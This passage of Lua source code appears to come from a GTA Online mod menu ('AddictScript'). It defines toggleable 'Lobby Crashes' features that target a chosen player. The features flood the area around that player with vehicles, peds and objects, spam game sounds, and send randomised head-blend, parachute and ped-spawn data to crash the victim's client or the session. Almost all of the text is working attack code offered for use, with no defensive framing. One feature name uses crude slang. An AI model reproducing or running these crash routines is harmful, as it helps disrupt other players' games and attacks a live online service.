    vehicle.create_vehicle(0x39D6E83F, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x15F27762, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x39D6E83F, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    for i = 1, #allpeds do
        if allpeds[i] ~= ownped then
            entity.set_entity_coords_no_offset(allpeds[i], player.get_player_coords(pid))
        end
    end
    for i = 1, #allvehicles do
        if allvehicles[i] ~= ownvehicle then
            entity.set_entity_coords_no_offset(allvehicles[i], player.get_player_coords(pid))
            vehicle.set_vehicle_on_ground_properly(allvehicles[i])
            vehicle.set_taxi_lights(allvehicles[i])
        end
    end
    for i = 1, #allobjects do
        entity.set_entity_coords_no_offset(allobjects[i], player.get_player_coords(pid))
    end
    system.wait(400)
    end
    ped.resurrect_ped(player.get_player_ped(pid))
    menu.notify("Finished", "Entity Dump Crash")
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Jet Cargo Dump Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server Entity Dump...", AddictScript)
    streaming.request_model(0x3F119114)
    streaming.request_model(0x15F27762)
    streaming.request_model(0x810369E2)
    for i=0, 10 do
    local allpeds = ped.get_all_peds()
    local allvehicles = vehicle.get_all_vehicles()
    local allobjects = object.get_all_objects()
    local ownped = player.get_player_ped(player.player_id())
    vehicle.create_vehicle(0x3F119114, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x15F27762, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x810369E2, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    for i = 1, #allpeds do
        if allpeds[i] ~= ownped then
            entity.set_entity_coords_no_offset(allpeds[i], player.get_player_coords(pid))
        end
    end
    for i = 1, #allvehicles do
        if allvehicles[i] ~= ownvehicle then
            entity.set_entity_coords_no_offset(allvehicles[i], player.get_player_coords(pid))
            vehicle.set_vehicle_on_ground_properly(allvehicles[i])
            vehicle.set_taxi_lights(allvehicles[i])
        end
    end
    for i = 1, #allobjects do
        entity.set_entity_coords_no_offset(allobjects[i], player.get_player_coords(pid))
    end
    system.wait(400)
    end
    ped.resurrect_ped(player.get_player_ped(pid))
    menu.notify("Finished", "Entity Dump Crash")
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Ear Rape Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server do feel Ear Rape's...", AddictScript)
    local time = utils.time_ms() + 100
		while time > utils.time_ms() do
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Object_Dropped_Remote", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        audio.play_sound_from_coord(-1, "Hum", player.get_player_coords(pid), "SECURITY_CAMERA", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Cash_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Event_Start_Text", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Checkpoint_Hit", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        audio.play_sound_from_coord(-1, "Return_To_Vehicle_Timer", player.get_player_coords(pid), "GTAO_FM_Events_Soundset", true, 1, true)
        system.wait(10)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "5s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        audio.play_sound_from_coord(-1, "10s", player.get_player_coords(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        audio.play_sound_from_coord(-1, "Arrive_Horn", player.get_player_coords(pid), "DLC_Apartment_Yacht_Streams_Soundset", true, 1, false)
        system.wait(10)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        audio.play_sound_from_coord(-1, "Biker_Ride_Off", player.get_player_coords(pid), "ARM_2_REPO_SOUNDS", true, 1, false)
        system.wait(10)
        end
			menu.notify("Ear Rape Crash executed successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Sound Spam", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		local time = utils.time_ms() + 100
		while time > utils.time_ms() do
			for i = 1, 10 do
				audio.play_sound_from_coord(-1, "Event_Message_Purple", player.get_player_coords(player.player_id()), "GTAO_FM_Events_Soundset", true, 99999, false)
			end
			system.wait(0)
		end
		menu.notify("Sound Spam Crash executed successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Bad Head Blend Data" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server do Bad Head Blend Data...", AddictScript)
        local model_hash = player.get_player_model(player.player_id())
		local outfit_component_table = {}
		local outfit_component_texture_table = {}
		local outfit_prop_table = {}
		local outfit_prop_texture_table = {}
		for i = 0, 11 do
			outfit_component_table[i] = ped.get_ped_drawable_variation(player.get_player_ped(player.player_id()), i)
			outfit_component_texture_table[i] = ped.get_ped_texture_variation(player.get_player_ped(player.player_id()), i)
		end
		for i = 0, 2 do
			outfit_prop_table[i] = ped.get_ped_prop_index(player.get_player_ped(player.player_id()), i)
			outfit_prop_texture_table[i] = ped.get_ped_prop_texture_index(player.get_player_ped(player.player_id()), i)
		end
        local time = utils.time_ms() + 10000
        while time > utils.time_ms() do
            system.yield(10)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 0, 17, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 1, 55, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 2, 40, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 3, 44, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 4, 31, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 5, 0, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 6, 24, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 7, 110, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 8, 55, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 9, 9, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 10, 45, math.random(0, 50), 0)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 11, 69, math.random(0, 50), 0)
            ped.set_ped_face_feature(player.get_player_ped(player.player_id()), 1, math.random(-1000, 1000))
            ped.set_ped_face_feature(player.get_player_ped(player.player_id()), 2, math.random(-1000, 1000))
            ped.set_ped_face_feature(player.get_player_ped(player.player_id()), 3, math.random(-1000, 1000))
            ped.set_ped_face_feature(player.get_player_ped(player.player_id()), 4, math.random(-1000, 1000))
            ped.set_ped_head_blend_data(player.get_player_ped(player.player_id()), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        end
        system.wait(500)
        player_func.change_player_model(model_hash, nil)
        system.wait(100)
		for i = 0, 11 do
			ped.set_ped_component_variation(player.get_player_ped(player.player_id()), i, outfit_component_table[i], outfit_component_texture_table[i], 0)
		end
		for i = 0, 2 do
			ped.set_ped_prop_index(player.get_player_ped(player.player_id()), i, outfit_prop_table[i], outfit_prop_texture_table[i], 0)
		end
			menu.notify("Bad Head Blend Data Executed A Loop Successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Bad Vehicle Parachute", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		utilities.request_model(941494461)
		local pos = player.get_player_coords(player.player_id())
		local parachute_vehicle = vehicle.create_vehicle(941494461, player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), true, false)
		utilities.request_control_silent(parachute_vehicle)
		entity.set_entity_god_mode(parachute_vehicle, true)
		vehicle.set_vehicle_parachute_model(parachute_vehicle, 1913502601)
		ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), parachute_vehicle, -1)
		entity.set_entity_velocity(parachute_vehicle, v3(0, 0, 40))
		local time = utils.time_ms() + 8000
		while time > utils.time_ms() do
			system.yield(0)
			vehicle.set_vehicle_parachute_active(parachute_vehicle, true)
		end
		if parachute_vehicle then
			utilities.request_control_silent(parachute_vehicle)
			utilities.hard_remove_entity(parachute_vehicle)
		end
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
		menu.notify("Bad Vehicle Parachute Crash executed successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Big Chungus Loop", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
        local ped_ = player.get_player_ped(pid)
        local pos = entity.get_entity_coords(ped_)
        local mdl = gameplay.get_hash_key("A_C_Cat_01")
        local mdl2 = gameplay.get_hash_key("U_M_Y_Zombie_01")
        local mdl3 = gameplay.get_hash_key("A_F_M_ProlHost_01")
        local mdl4 = gameplay.get_hash_key("A_M_M_SouCent_01")
        local veh_mdl = gameplay.get_hash_key("insurgent2")
        local veh_mdl2 = gameplay.get_hash_key("brawler")
        utilities.request_model(veh_mdl)
        utilities.request_model(veh_mdl2)
        utilities.request_model(mdl)
        utilities.request_model(mdl2)
        utilities.request_model(mdl3)
        utilities.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = ped.create_ped(1, mdl, pos + 20, 0, true, false)
            local ped_ = ped.create_ped(1, mdl2, pos + 20, 0, true, false)
            local ped3 = ped.create_ped(1, mdl3, pos + 20, 0, true, false)
            local ped3 = ped.create_ped(1, mdl4, pos + 20, 0, true, false)
            local veh = vehicle.create_vehicle(veh_mdl, pos + 20, 0, true, false)
            local veh2 = vehicle.create_vehicle(veh_mdl2, pos + 20, 0, true, false)
            ped.set_ped_into_vehicle(ped1, veh, -1)
            ped.set_ped_into_vehicle(ped_, veh, -1)
    
            ped.set_ped_into_vehicle(ped1, veh2, -1)
            ped.set_ped_into_vehicle(ped_, veh2, -1)
    
            ped.set_ped_into_vehicle(ped1, veh, -1)
            ped.set_ped_into_vehicle(ped_, veh, -1)
    
            ped.set_ped_into_vehicle(ped1, veh2, -1)
            ped.set_ped_into_vehicle(ped_, veh2, -1)
    
            ped.set_ped_into_vehicle(mdl3, veh, -1)
            ped.set_ped_into_vehicle(mdl3, veh2, -1)
    
            ped.set_ped_into_vehicle(mdl4, veh, -1)
            ped.set_ped_into_vehicle(mdl4, veh2, -1)
    
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    
            natives.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
    
            natives.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            natives.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            system.yield(100)
            ped.set_ped_component_variation(mdl, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 0, 0, 0)
    
            ped.set_ped_component_variation(mdl2, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 0, 0, 0)
    
            ped.set_ped_component_variation(mdl3, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl3, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl3, 0, 0, 0, 0)
            
            ped.set_ped_component_variation(mdl4, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl4, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl4, 0, 0, 0, 0)
    
            ped.clear_ped_tasks_immediately(mdl)
            ped.clear_ped_tasks_immediately(mdl2)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl2, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl3, "CTaskDoNothing", 0, false)
            ai.task_start_scenario_in_place(mdl4, "CTaskDoNothing", 0, false)
    
            natives.SET_ENTITY_HEALTH(mdl, false, 200)
            natives.SET_ENTITY_HEALTH(mdl2, false, 200)
            natives.SET_ENTITY_HEALTH(mdl3, false, 200)
            natives.SET_ENTITY_HEALTH(mdl4, false, 200)
    
            ped.set_ped_component_variation(mdl, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl, 0, 0, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 2, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 1, 0, 0)
            ped.set_ped_component_variation(mdl2, 0, 0, 0, 0)
            ped.clear_ped_tasks_immediately(mdl2)
